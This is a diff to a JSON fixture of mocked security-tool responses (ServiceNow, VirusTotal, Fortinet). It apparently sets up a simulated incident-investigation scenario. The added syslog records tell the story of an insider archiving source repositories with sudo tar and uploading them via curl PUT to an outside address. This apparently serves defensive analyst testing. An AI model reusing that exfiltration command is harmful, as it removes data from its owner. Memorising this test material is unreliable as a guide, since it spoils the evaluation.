@@ -26,6 +26,27 @@
    "version": "3.0.0",
    "label": "VirusTotal",
    "config_count": 1
+  },
+  {
+   "name": "fortinet-fortiedr",
+   "status": "Completed",
+   "version": "5.0.0",
+   "label": "Fortinet FortiEDR",
+   "config_count": 1
+  },
+  {
+   "name": "fortinet-fortimanager-json-rpc",
+   "status": "Completed",
+   "version": "1.0.0",
+   "label": "Fortinet FortiManager (JSON-RPC)",
+   "config_count": 1
+  },
+  {
+   "name": "fortinet-fortisiemv2",
+   "status": "Completed",
+   "version": "4.0.0",
+   "label": "Fortinet FortiSIEM v2",
+   "config_count": 1
   }
  ],
  "enrichment_actions": {
@@ -85,7 +106,11 @@
     "destinationIp": "203.0.113.9"
    }
   ],
-  "assets": []
+  "assets": [],
+  "incidents": [],
+  "identities": [],
+  "indicators": [],
+  "faz_logs": []
  },
  "ops": [
   {
@@ -714,6 +739,463 @@
     "data": {
      "result": []
     }
+   }
+  },
+  {
+   "connector": "servicenow",
+   "op": "get_SIR",
+   "contains": {
+    "*": [
+     "10.30.8.12"
+    ]
+   },
+   "response": {
+    "ok": true,
+    "data": {
+     "result": [
+      {
+       "sys_id": "c3d4e5f6",
+       "name": "wks-dev-12",
+       "sys_class_name": "cmdb_ci_computer",
+       "ip_address": "10.30.8.12",
+       "assigned_to": "Ingrid Larsen (ilarsen)",
+       "department": "Platform",
+       "operational_status": "Operational"
+      }
+     ]
+    }
+   }
+  },
+  {
+   "connector": "servicenow",
+   "op": "get_change_request_details",
+   "contains": {
+    "*": [
+     "10.30.8.12"
+    ]
+   },
+   "response": {
+    "ok": true,
+    "data": {
+     "result": [
+      {
+       "sys_id": "c3d4e5f6",
+       "name": "wks-dev-12",
+       "sys_class_name": "cmdb_ci_computer",
+       "ip_address": "10.30.8.12",
+       "assigned_to": "Ingrid Larsen (ilarsen)",
+       "department": "Platform",
+       "operational_status": "Operational"
+      }
+     ]
+    }
+   }
+  },
+  {
+   "connector": "servicenow",
+   "op": "search_records",
+   "contains": {
+    "*": [
+     "10.30.8.12"
+    ]
+   },
+   "response": {
+    "ok": true,
+    "data": {
+     "result": [
+      {
+       "sys_id": "c3d4e5f6",
+       "name": "wks-dev-12",
+       "sys_class_name": "cmdb_ci_computer",
+       "ip_address": "10.30.8.12",
+       "assigned_to": "Ingrid Larsen (ilarsen)",
+       "department": "Platform",
+       "operational_status": "Operational"
+      }
+     ]
+    }
+   }
+  },
+  {
+   "connector": "servicenow",
+   "op": "get_SIR",
+   "contains": {
+    "*": [
+     "ilarsen"
+    ]
+   },
+   "response": {
+    "ok": true,
+    "data": {
+     "result": [
+      {
+       "table": "syslog",
+       "message": "Nov 03 02:01:11 vpngw: session open user=ilarsen src=10.30.8.12 dst=git-int-01"
+      },
+      {
+       "table": "syslog",
+       "message": "Nov 03 02:03:40 authgw sshd[991]: Accepted publickey for ilarsen from 10.30.8.12 to dev-build-07"
+      },
+      {
+       "table": "syslog",
+       "message": "Nov 03 02:09:12 dev-build-07 sudo: ilarsen : COMMAND=/usr/bin/tar czf /dev/shm/src.tgz /srv/repos"
+      },
+      {
+       "table": "syslog",
+       "message": "Nov 03 02:15:30 dev-build-07 curl: PUT https://203.0.113.9/up/src.tgz"
+      }
+     ]
+    }
+   }
+  },
+  {
+   "connector": "servicenow",
+   "op": "get_change_request_details",
+   "contains": {
+    "*": [
+     "ilarsen"
+    ]
+   },
+   "response": {
+    "ok": true,
+    "data": {
+     "result": [
+      {
+       "table": "syslog",
+       "message": "Nov 03 02:01:11 vpngw: session open user=ilarsen src=10.30.8.12 dst=git-int-01"
+      },
+      {
+       "table": "syslog",
+       "message": "Nov 03 02:03:40 authgw sshd[991]: Accepted publickey for ilarsen from 10.30.8.12 to dev-build-07"
+      },
+      {
+       "table": "syslog",
+       "message": "Nov 03 02:09:12 dev-build-07 sudo: ilarsen : COMMAND=/usr/bin/tar czf /dev/shm/src.tgz /srv/repos"
+      },
+      {
+       "table": "syslog",
+       "message": "Nov 03 02:15:30 dev-build-07 curl: PUT https://203.0.113.9/up/src.tgz"
+      }
+     ]
+    }
+   }
+  },
+  {
+   "connector": "servicenow",
+   "op": "search_records",
+   "contains": {
+    "*": [
+     "ilarsen"
+    ]
+   },
+   "response": {
+    "ok": true,
+    "data": {
+     "result": [
+      {
+       "table": "syslog",
+       "message": "Nov 03 02:01:11 vpngw: session open user=ilarsen src=10.30.8.12 dst=git-int-01"
+      },
+      {
+       "table": "syslog",
+       "message": "Nov 03 02:03:40 authgw sshd[991]: Accepted publickey for ilarsen from 10.30.8.12 to dev-build-07"
+      },
+      {
+       "table": "syslog",
+       "message": "Nov 03 02:09:12 dev-build-07 sudo: ilarsen : COMMAND=/usr/bin/tar czf /dev/shm/src.tgz /srv/repos"
+      },
+      {
+       "table": "syslog",
+       "message": "Nov 03 02:15:30 dev-build-07 curl: PUT https://203.0.113.9/up/src.tgz"
+      }
+     ]
+    }
+   }
+  },
+  {
+   "connector": "servicenow",
+   "op": "get_SIR",
+   "contains": {
+    "*": [
+     "rquist"
+    ]
+   },
+   "response": {
+    "ok": true,
+    "data": {
+     "result": [
+      {
+       "table": "syslog",
+       "message": "Oct 12 10:00:00 authgw sshd[11]: Accepted publickey for rquist from 10.30.8.12 to git-int-01"
+      }
+     ]
+    }
+   }
+  },
+  {
+   "connector": "servicenow",
+   "op": "get_change_request_details",
+   "contains": {
+    "*": [
+     "rquist"
+    ]
+   },
+   "response": {
+    "ok": true,
+    "data": {
+     "result": [
+      {
+       "table": "syslog",
+       "message": "Oct 12 10:00:00 authgw sshd[11]: Accepted publickey for rquist from 10.30.8.12 to git-int-01"
+      }
+     ]
+    }
+   }
+  },
+  {
+   "connector": "servicenow",
+   "op": "search_records",
+   "contains": {
+    "*": [
+     "rquist"
+    ]
+   },
+   "response": {
+    "ok": true,
+    "data": {
+     "result": [
+      {
+       "table": "syslog",
+       "message": "Oct 12 10:00:00 authgw sshd[11]: Accepted publickey for rquist from 10.30.8.12 to git-int-01"
+      }
+     ]
+    }
+   }
+  },
+  {
+   "connector": "servicenow",
+   "op": "get_SIR",
+   "contains": {
+    "*": [
+     "wks-dev-12",
+     "10.30.8.12"
+    ]
+   },
+   "response": {
+    "ok": true,
+    "data": {
+     "result": [
+      {
+       "table": "syslog",
+       "message": "Nov 03 02:01:11 vpngw: session open src=10.30.8.12 dst=git-int-01"
+      },
+      {
+       "table": "syslog",
+       "message": "Nov 03 02:15:31 fw: allow 10.30.8.12 -> 203.0.113.9:443 bytes=4100000000"
+      }
+     ]
+    }
+   }
+  },
+  {
+   "connector": "servicenow",
+   "op": "get_change_request_details",
+   "contains": {
+    "*": [
+     "wks-dev-12",
+     "10.30.8.12"
+    ]
+   },
+   "response": {
+    "ok": true,
+    "data": {
+     "result": [
+      {
+       "table": "syslog",
+       "message": "Nov 03 02:01:11 vpngw: session open src=10.30.8.12 dst=git-int-01"
+      },
+      {
+       "table": "syslog",
+       "message": "Nov 03 02:15:31 fw: allow 10.30.8.12 -> 203.0.113.9:443 bytes=4100000000"
+      }
+     ]
+    }
+   }
+  },
+  {
+   "connector": "servicenow",
+   "op": "search_records",
+   "contains": {
+    "*": [
+     "wks-dev-12",
+     "10.30.8.12"
+    ]
+   },
+   "response": {
+    "ok": true,
+    "data": {
+     "result": [
+      {
+       "table": "syslog",
+       "message": "Nov 03 02:01:11 vpngw: session open src=10.30.8.12 dst=git-int-01"
+      },
+      {
+       "table": "syslog",
+       "message": "Nov 03 02:15:31 fw: allow 10.30.8.12 -> 203.0.113.9:443 bytes=4100000000"
+      }
+     ]
+    }
+   }
+  },
+  {
+   "connector": "servicenow",
+   "op": "advance_search",
+   "response": {
+    "ok": true,
+    "data": {
+     "result": []
+    }
+   }
+  },
+  {
+   "connector": "servicenow",
+   "op": "fetch_incidents",
+   "response": {
+    "ok": true,
+    "data": {
+     "result": []
+    }
+   }
+  },
+  {
+   "connector": "servicenow",
+   "op": "get_SIR",
+   "response": {
+    "ok": true,
+    "data": {
+     "result": []
+    }
+   }
+  },
+  {
+   "connector": "servicenow",
+   "op": "get_change_request_details",
+   "response": {
+    "ok": true,
+    "data": {
+     "result": []
+    }
+   }
+  },
+  {
+   "connector": "servicenow",
+   "op": "get_users",
+   "response": {
+    "ok": true,
+    "data": {
+     "result": []
+    }
+   }
+  },
+  {
+   "connector": "servicenow",
+   "op": "search_record",
+   "response": {
+    "ok": true,
+    "data": {
+     "result": []
+    }
+   }
+  },
+  {
+   "connector": "servicenow",
+   "op": "search_records",
+   "response": {
+    "ok": true,
+    "data": {
+     "result": []
+    }
+   }
+  },
+  {
+   "connector": "virustotal",
+   "op": "query_ip",
+   "response": {
+    "ok": true,
+    "data": {
+     "error": "no reputation record for this indicator in the recorded world"
+    }
+   }
+  },
+  {
+   "connector": "virustotal",
+   "op": "query_domain",
+   "response": {
+    "ok": true,
+    "data": {
+     "error": "no reputation record for this indicator in the recorded world"
+    }
+   }
+  },
+  {
+   "connector": "fortinet-fortiedr",
+   "op": "get_collector_list",
+   "response": {
+    "ok": true,
+    "data": []
+   }
+  },
+  {
+   "connector": "fortinet-fortimanager-json-rpc",
+   "op": "json_rpc_get",
+   "response": {
+    "ok": true,
+    "data": []
+   }
+  },
+  {
+   "connector": "fortinet-fortisiemv2",
+   "op": "execute_api_request",
+   "match": {
+    "endpoint": "/rest/pub/v2/query/eventQuery"
+   },
+   "response": {
+    "ok": true,
+    "data": {
+     "queryId": "ka-q-empty"
+    }
+   }
+  },
+  {
+   "connector": "fortinet-fortisiemv2",
+   "op": "execute_api_request",
+   "match": {
+    "endpoint": "/rest/pub/v2/query/progress"
+   },
+   "response": {
+    "ok": true,
+    "data": {
+     "progress": 100
+    }
+   }
+  },
+  {
+   "connector": "fortinet-fortisiemv2",
+   "op": "execute_api_request",
+   "match": {
+    "endpoint": "/rest/pub/v2/query/events/results"
+   },
+   "response": {
+    "ok": true,
+    "data": []
+   }
+  },
+  {
+   "connector": "fortinet-fortisiemv2",
+   "op": "execute_api_request",
+   "response": {
+    "ok": true,
+    "data": []
    }
   }
  ]
